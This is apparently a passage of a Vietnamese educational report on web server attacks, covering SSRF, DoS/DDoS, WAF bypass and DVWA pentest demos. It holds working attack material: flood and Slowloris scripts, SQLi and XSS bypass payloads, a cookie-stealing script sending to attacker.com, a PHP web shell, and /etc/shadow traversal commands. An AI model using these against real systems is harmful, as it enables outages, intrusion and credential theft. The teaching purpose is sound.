# Different representations of 127.0.0.1
2130706433 (decimal)
017700000001 (octal)
0x7f000001 (hex)
127.1
localhost
```

**b) DNS Rebinding**

```
# Domain pointing to internal IP
http://malicious-domain.com -> 192.168.1.100
```

**c) URL Parser Confusion**

```
http://google.com@192.168.1.1/
http://192.168.1.1#google.com
```

#### 2.6.5. Biện pháp phòng chống SSRF

**a) URL Allowlisting**

```python
allowed_domains = ['api.trusted-partner.com', 'cdn.example.com']
if parsed_url.netloc not in allowed_domains:
    raise SecurityError('Domain not allowed')
```

**b) Network Segmentation**

- Isolate application servers from internal networks
- Use firewalls to restrict outbound connections
- Implement network-level access controls

**c) Input Validation**

```python
import ipaddress

def is_private_ip(ip):
    return ipaddress.ip_address(ip).is_private

if is_private_ip(target_ip):
    raise SecurityError('Private IP access denied')
```

### 2.7. Tấn công từ chối dịch vụ (DoS/DDoS)

#### 2.7.1. Phân biệt DoS và DDoS

**Denial of Service (DoS):**
Tấn công từ một nguồn duy nhất nhằm làm gián đoạn dịch vụ bằng cách làm quá tải tài nguyên hệ thống.

**Distributed Denial of Service (DDoS):**
Tấn công từ nhiều nguồn phân tán (thường là botnet) với quy mô và sức mạnh lớn hơn nhiều. Năm 2025, các cuộc tấn công DDoS đã trở nên phổ biến hơn với quy mô thường xuyên vượt quá 2 Tbps `<citation>`48 `</citation>`.

#### 2.7.2. Các dạng tấn công theo lớp OSI

**a) Layer 3/4 Attacks (Network/Transport Layer)**

*UDP Flood:*

```bash
hping3 -2 -p 80 --flood target-server.com
```

*SYN Flood:*

```bash
hping3 -S -p 80 --flood --rand-source target-server.com
```

*ICMP Flood:*

```bash
hping3 -1 --flood target-server.com
```

**b) Layer 7 Attacks (Application Layer)**

*HTTP Flood:*

```python
import requests
import threading

def http_flood():
    while True:
        try:
            requests.get('http://target-server.com/heavy-page')
        except:
            pass

for i in range(1000):
    t = threading.Thread(target=http_flood)
    t.start()
```

*Slowloris Attack:*

```python
import socket
import time

def slowloris_attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('target-server.com', 80))
    sock.send(b"GET / HTTP/1.1\r\nHost: target-server.com\r\n")
  
    while True:
        sock.send(b"X-a: b\r\n")
        time.sleep(15)
```

#### 2.7.3. Các kỹ thuật DDoS nâng cao

**a) Reflection/Amplification Attacks**

*DNS Amplification:*

```bash
# Send small query, get large response
dig @public-dns-server ANY large-domain.com
```

*NTP Amplification:*

```bash
ntpdc -n -c monlist target-ntp-server
```

**b) IoT Botnets**

- Mirai botnet variants
- Exploiting default credentials in IoT devices
- P2P botnet architectures

#### 2.7.4. Hậu quả và case studies

**Tác động kinh tế:**

- Downtime cost: $5,600 per minute cho doanh nghiệp vừa
- Loss of customer trust và brand reputation
- Operational costs cho incident response

**Case studies nổi tiếng:**

- **GitHub (2018):** 1.35 Tbps memcached amplification attack
- **Dyn DNS (2016):** Mirai botnet attack affecting major websites
- **Cloudflare (2020):** 2.3 Tbps attack using CLDAP reflection

#### 2.7.5. Biện pháp phòng chống DDoS

**a) Rate Limiting**

```nginx
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req zone=api burst=20 nodelay;
```

**b) Traffic Filtering**

```bash
# iptables rules
iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP
```

**c) CDN và DDoS Protection Services**

- Cloudflare DDoS Protection
- AWS Shield Advanced
- Akamai Kona Site Defender

**d) Network-level Protection**

```bash
# BGP Blackholing
router bgp 65001
 ip route 192.0.2.1/32 null0
 network 192.0.2.1/32
```

### 2.8. Web Application Firewall (WAF) Bypass Techniques

#### 2.8.1. Giới thiệu về WAF Bypass

Web Application Firewall (WAF) là một lớp bảo vệ quan trọng, nhưng năm 2025, các kỹ thuật bypass WAF ngày càng tinh vi. Kẻ tấn công sử dụng các phương pháp obfuscation, parsing discrepancies và advanced fuzzing để vượt qua các quy tắc bảo mật `<citation>`59,60 `</citation>`.

#### 2.8.2. Các kỹ thuật Bypass phổ biến

**a) Payload Obfuscation**

*SQL Injection Bypass:*

```sql
-- Original: ' OR 1=1--
-- Bypassed: ' /*comment*/ OR /*comment*/ 1=1--
-- Bypassed: ' OR 1=1#
-- Bypassed: ' OR 'a'='a'--
```

*XSS Bypass:*

```html
<!-- Original: <script>alert(1)</script> -->
<!-- Bypassed: <sCrIpT>alert(1)</sCrIpT> -->
<!-- Bypassed: <img src=x onerror=alert(1)> -->
<!-- Bypassed: <svg onload=alert(1)> -->
```

**b) HTTP Method Tampering**

```http
# If POST is blocked, try other methods
PUT /api/users HTTP/1.1
X-HTTP-Method-Override: POST
```

**c) Header Injection**

```http
GET /search?q=test HTTP/1.1
Host: target.com
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
```

#### 2.8.3. Advanced Bypass Techniques

**a) JSON/XML Format Abuse**

```json
{
  "query": "test\u0027 OR 1=1--",
  "data": {
    "<script>alert(1)</script>": "value"
  }
}
```

**b) Charset Manipulation**

```http
Content-Type: application/x-www-form-urlencoded; charset=utf-7
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

**c) HPP (HTTP Parameter Pollution)**

```http
POST /search HTTP/1.1

q=test&q=' OR 1=1--
```

#### 2.8.4. Tools cho WAF Bypass

**a) Automated Tools**

```bash
# WAF bypass tools
wafw00f target.com
w3af
sqlmap --tamper=space2comment
```

**b) Custom Scripts**

```python
import requests

payloads = [
    "' OR 1=1--",
    "' /*comment*/ OR /*comment*/ 1=1--",
    "' OR 'a'='a'--"
]

for payload in payloads:
    response = requests.get(f"http://target.com/search?q={payload}")
    if "error" not in response.text:
        print(f"Potential bypass: {payload}")
```

---

## 3. THỰC HÀNH VÀ ĐÁNH GIÁ BẢO MẬT

### 3.1. Giới thiệu về Kiểm thử Xâm nhập (Penetration Testing)

#### 3.1.1. Định nghĩa và mục đích

Kiểm thử xâm nhập (Penetration Testing hay Pentest) là quá trình mô phỏng các cuộc tấn công mạng có kiểm soát để đánh giá bảo mật của hệ thống, ứng dụng và mạng. Mục đích chính là xác định các lỗ hổng bảo mật trước khi kẻ tấn công thực sự khai thác chúng.

#### 3.1.2. Các giai đoạn của Penetration Testing

**a) Planning và Reconnaissance**

- Định nghĩa scope và objectives
- Thu thập thông tin về target (OSINT)
- Passive và active reconnaissance

**b) Scanning và Enumeration**

- Port scanning với Nmap
- Service enumeration
- Vulnerability assessment

**c) Gaining Access**

- Exploit vulnerabilities
- Social engineering attacks
- Physical security testing

**d) Maintaining Access**

- Install backdoors
- Privilege escalation
- Lateral movement

**e) Analysis và Reporting**

- Document findings
- Risk assessment
- Remediation recommendations

### 3.2. Các công cụ và môi trường thực hành

#### 3.2.1. Môi trường Lab

**a) Vulnerable Applications**

- DVWA (Damn Vulnerable Web Application)
- WebGoat
- Mutillidae
- bWAPP
- VulnHub VMs

**b) Testing Distributions**

- Kali Linux
- Parrot Security OS
- BlackArch Linux

#### 3.2.2. Essential Penetration Testing Tools

**a) Reconnaissance Tools**

```bash
# Nmap - Network scanning
nmap -sS -sV -sC target.com

# Gobuster - Directory bruteforcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Nikto - Web vulnerability scanner
nikto -h http://target.com
```

**b) Web Application Testing**

```bash
# Burp Suite - Web proxy
# Manual testing and automated scanning

# SQLmap - SQL injection testing
sqlmap -u "http://target.com/page?id=1" --dbs

# XSStrike - XSS detection
python3 xsstrike.py -u "http://target.com/search?q=test"
```

**c) Exploitation Frameworks**

```bash
# Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
exploit

# Social Engineer Toolkit (SET)
setoolkit
```

### 3.3. Mô phỏng các bước thực hiện demo

#### 3.3.1. Demo 1: SQL Injection Testing

**Bước 1: Setup Environment**

```bash
# Start DVWA in Docker
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

**Bước 2: Manual Testing**

```sql
-- Test basic injection
' OR '1'='1

-- Test UNION injection
' UNION SELECT 1,version(),database()--

-- Extract data
' UNION SELECT 1,user,password FROM users--
```

**Bước 3: Automated Testing**

```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" \
       --cookie="PHPSESSID=xxx; security=low" \
       --dbs
```

#### 3.3.2. Demo 2: XSS Testing

**Bước 1: Reflected XSS**

```html
<!-- Test payload in search form -->
<script>alert('XSS')</script>

<!-- Advanced payload -->
<img src=x onerror=alert(document.cookie)>
```

**Bước 2: Stored XSS**

```html
<!-- In comment/feedback form -->
<script>
var img = new Image();
img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>
```

**Bước 3: DOM-based XSS**

```javascript
// Exploit DOM manipulation
http://vulnerable-site.com/page#<img src=x onerror=alert(1)>
```

#### 3.3.3. Demo 3: File Upload Attack

**Bước 1: Basic Webshell Upload**

```php
<?php
// simple-shell.php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>
```

**Bước 2: Bypass File Type Restrictions**

```bash
# Try different extensions
shell.php
shell.php5
shell.phtml
shell.php.jpg
```

**Bước 3: Access Uploaded Shell**

```bash
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=ls -la"
```

#### 3.3.4. Demo 4: Directory Traversal

**Bước 1: Basic Testing**

```bash
# Test different payloads
curl "http://target.com/view.php?file=../../../etc/passwd"
curl "http://target.com/view.php?file=....//....//....//etc/passwd"
```

**Bước 2: Encoding Bypass**

```bash
# URL encoded payloads
curl "http://target.com/view.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

**Bước 3: Extract Sensitive Files**

```bash
# Common files to target
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
/proc/version
/proc/self/environ
```

---

## 4. KẾT LUẬN VÀ KHUYẾN NGHỊ

### 4.1. Tổng kết các kỹ thuật tấn công

Các kỹ thuật tấn công web server đã được phân tích trong bài nghiên cứu này cho thấy sự đa dạng và phức tạp của mối đe dọa an ninh mạng hiện tại. Từ các cuộc tấn công truyền thống như SQL Injection và XSS đến các kỹ thuật tinh vi hơn như SSRF và WAF bypass, kẻ tấn công liên tục phát triển các phương pháp mới để khai thác lỗ hổng bảo mật.

### 4.2. Xu hướng phát triển năm 2025

Năm 2025 chứng kiến những thay đổi đáng kể trong bối cảnh an ninh mạng:

- Sự gia tăng của các cuộc tấn công nhắm vào AI và machine learning systems
- Phát triển của các botnet IoT quy mô lớn
- Tăng cường sử dụng automation trong both attack và defense
- Cloud security trở thành priority hàng đầu

### 4.3. Khuyến nghị bảo mật

**Cho các nhà phát triển:**

- Implement secure coding practices từ giai đoạn đầu
- Regular security training và awareness
- Sử dụng automated security testing tools
- Follow OWASP guidelines và best practices

**Cho các tổ chức:**

- Establish comprehensive security policies
- Regular penetration testing và vulnerability assessments
- Incident response planning và testing
- Investment in security tools và personnel training

**Cho cộng đồng:**

- Shared threat intelligence
- Collaborative research in cybersecurity
- Support for open source security projects
- Education và awareness programs

### 4.4. Hướng nghiên cứu tương lai

- AI-driven attack detection và response
- Quantum computing impact on cryptography
- Advanced persistent threats (APTs) evolution
- Zero-trust architecture implementation
- Behavioral analysis for anomaly detection

---

## TÀI LIỆU THAM KHẢO

[1] "OWASP Top Ten | OWASP Foundation." Accessed: Oct. 06, 2025. [Online]. Available: https://owasp.org/www-project-top-ten/

[2] "An toàn thông tin là gì? 4 Nội dung cần biết." Accessed: Oct. 06, 2025. [Online]. Available: https://vnce.vn/an-toan-thong-tin-la-gi

[3] "Các Lỗ Hổng Bảo Mật của Website bị HACKER Tấn Công Nhất." Accessed: Oct. 06, 2025. [Online]. Available: https://lanit.com.vn/cac-lo-hong-bao-mat-cua-website-bi-hacker-loi-dung-tan-cong-nhieu-nhat.html

[4] "10 Web Application Security Threats for 2025 & How to Respond," StackHawk. Accessed: Oct. 06, 2025. [Online]. Available: https://www.stackhawk.com/blog/10-web-application-security-threats-and-how-to-mitigate-them/

[5] "SQL Injection là gì? Cách giảm thiểu và phòng ngừa SQL Injection." Accessed: Oct. 06, 2025. [Online]. Available: https://topdev.vn/blog/sql-injection/

[6] "SQL Injection là gì? Độ nguy hiểm và cách phòng tránh hiệu quả." Accessed: Oct. 06, 2025. [Online]. Available: https://fptshop.com.vn/tin-tuc/danh-gia/sql-injection-la-gi-159279

[7] "What is OWASP? OWASP Top 10 Vulnerabilities & Risks - F5." Accessed: Oct. 06, 2025. [Online]. Available: https://www.f5.com/glossary/owasp

[8] "Tam giác bảo mật CIA (tính bảo mật, tính toàn vẹn, tính sẵn sàng) là gì?" Accessed: Oct. 06, 2025. [Online]. Available: https://3ac.vn/tam-giac-bao-mat-cia-tinh-bao-mat-tinh-toan-ven-tinh-san-sang-la-gi/

[9] "Hacker là gì? Phân biệt 7 loại hacker phổ biến nhất," TopCV Blog. Accessed: Oct. 06, 2025. [Online]. Available: https://blog.topcv.vn/hacker-la-gi/

[10] "The OWASP Top Ten 2025." Accessed: Oct. 06, 2025. [Online]. Available: https://www.owasptopten.org/

[11] "Cyber Kill Chain® | Lockheed Martin." Accessed: Oct. 06, 2025. [Online]. Available: https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html

[12] "The Cyber Kill Chain: A Complete Guide for 2025 - RSVR Tech." Accessed: Oct. 06, 2025. [Online]. Available: https://www.rsvrtech.com/blog/cyber-kill-chain-guide-2025/

[13] "SQL Injection." Accessed: Oct. 06, 2025. [Online]. Available: https://viblo.asia/p/sql-injection-MgNeWWbKeYx

[14] "Breaking down the 5 most common SQL injection attacks," Pentest-Tools.com. Accessed: Oct. 06, 2025. [Online]. Available: https://pentest-tools.com/blog/sql-injection-attacks

[15] "Applying the Cyber Kill Chain in 2025 - LinkedIn." Accessed: Oct. 06, 2025. [Online]. Available: https://www.linkedin.com/pulse/cyber-kill-chain-explained-applying-2025-strongbox-it-pvt-ltd-s9lzf

[16] "What is Cross-site Scripting (XSS): prevention and fixes." Accessed: Oct. 06, 2025. [Online]. Available: https://www.acunetix.com/websitesecurity/cross-site-scripting/

[17] "Lỗ hổng Cross-Site Scripting (XSS)." Accessed: Oct. 06, 2025. [Online]. Available: https://viblo.asia/p/lo-hong-cross-site-scripting-xss-GrLZDOY3Kk0

[18] "Cyber Kill Chain Breakdown: Command and Control | Alert Logic." Accessed: Oct. 06, 2025. [Online]. Available: https://www.alertlogic.com/blog/cyber-kill-chain-breakdown-understanding-stage-six-command-and-control/

[19] "Cyber Kill Chain Explained: Framework, Stages, and Strategies." Accessed: Oct. 06, 2025. [Online]. Available: https://blog.securelayer7.net/cyber-kill-chain/

[20] "OWASP Top Ten." Accessed: Oct. 06, 2025. [Online]. Available: https://owasp.org/www-project-top-ten/

[21] "CISA Adds Five Known Exploited Vulnerabilities to Catalog." Accessed: Oct. 06, 2025. [Online]. Available: https://www.cisa.gov/news-events/alerts/2025/09/29/cisa-adds-five-known-exploited-vulnerabilities-catalog

[22] "Top 10 Exploited Vulnerabilities in 2025 [Updated] - Astra Security." Accessed: Oct. 06, 2025. [Online]. Available: https://www.getastra.com/blog/security-audit/top-vulnerabilities/

[31] "Common Web Application Vulnerabilities in 2025 - Iterasec." Accessed: Oct. 06, 2025. [Online]. Available: https://iterasec.com/blog/common-web-application-vulnerabilities/

[33] "What is SQL Injection? Tutorial & Examples | Web Security Academy." Accessed: Oct. 06, 2025. [Online]. Available: https://portswigger.net/web-security/sql-injection

[34] "Cross Site Scripting (XSS) - OWASP Foundation." Accessed: Oct. 06, 2025. [Online]. Available: https://owasp.org/www-community/attacks/xss/

[36] "Breaking down the 5 most common SQL injection attacks." Accessed: Oct. 06, 2025. [Online]. Available: https://pentest-tools.com/blog/sql-injection-attacks

[37] "Understanding Cyber Attacks in 2025 & 15 Critical Defenses." Accessed: Oct. 06, 2025. [Online]. Available: https://www.cycognito.com/learn/cyber-attack/

[38] "5 common web attacks: How to exploit and defend against them." Accessed: Oct. 06, 2025. [Online]. Available: https://www.hackthebox.com/blog/5-common-web-attacks

[48] "DDoS Trends & Predictions For 2025 - Cyber Security Intelligence." Accessed: Oct. 06, 2025. [Online]. Available: https://www.cybersecurityintelligence.com/blog/ddos-trends-and-predictions-for-2025-8350.html

[49] "CSRF, XSS, SSRF: The Attacks That Still Break the Web in 2025 | by Aj." Accessed: Oct. 06, 2025. [Online]. Available: https://levelup.gitconnected.com/csrf-xss-ssrf-the-attacks-that-still-break-the-web-in-2025-6e2774c62ad6

[50] "Server-Side Request Forgery: What It Is & How To Fix It | Wiz." Accessed: Oct. 06, 2025. [Online]. Available: https://www.wiz.io/academy/server-side-request-forgery

[51] "How to Prevent SSRF Attacks in 2025 - Ghost Security." Accessed: Oct. 06, 2025. [Online]. Available: https://ghostsecurity.com/blog/how-to-prevent-ssrf-attacks-in-2025

[55] "Common Web Application Vulnerabilities in 2025 - Iterasec." Accessed: Oct. 06, 2025. [Online]. Available: https://iterasec.com/blog/common-web-application-vulnerabilities/

[58] "Over 400 IPs Exploiting Multiple SSRF Vulnerabilities." Accessed: Oct. 06, 2025. [Online]. Available: https://thehackernews.com/2025/03/over-400-ips-exploiting-multiple-ssrf.html

[59] "Web Application Firewall (WAF) Bypass Techniques that Work in 2025." Accessed: Oct. 06, 2025. [Online]. Available: https://medium.com/infosecmatrix/web-application-firewall-waf-bypass-techniques-that-work-in-2025-b11861b2767b

[60] "Exploiting Parsing Discrepancies to Bypass Web Application Firewalls." Accessed: Oct. 06, 2025. [Online]. Available: https://arxiv.org/html/2503.10846v1

[69] "Directory Traversal Attack: Path traversal explained - Acunetix." Accessed: Oct. 06, 2025. [Online]. Available: https://www.acunetix.com/websitesecurity/directory-traversal/

[70] "Path Traversal | OWASP Foundation." Accessed: Oct. 06, 2025. [Online]. Available: https://owasp.org/www-community/attacks/Path_Traversal

[71] "What is Web Directory Traversal Attack And How To Deal With It." Accessed: Oct. 06, 2025. [Online]. Available: https://helpcenter.trendmicro.com/en-us/article/tmka-18751

[72] "What is Directory Traversal | Risks, Examples & Prevention - Imperva." Accessed: Oct. 06, 2025. [Online]. Available: https://www.imperva.com/learn/application-security/directory-traversal/
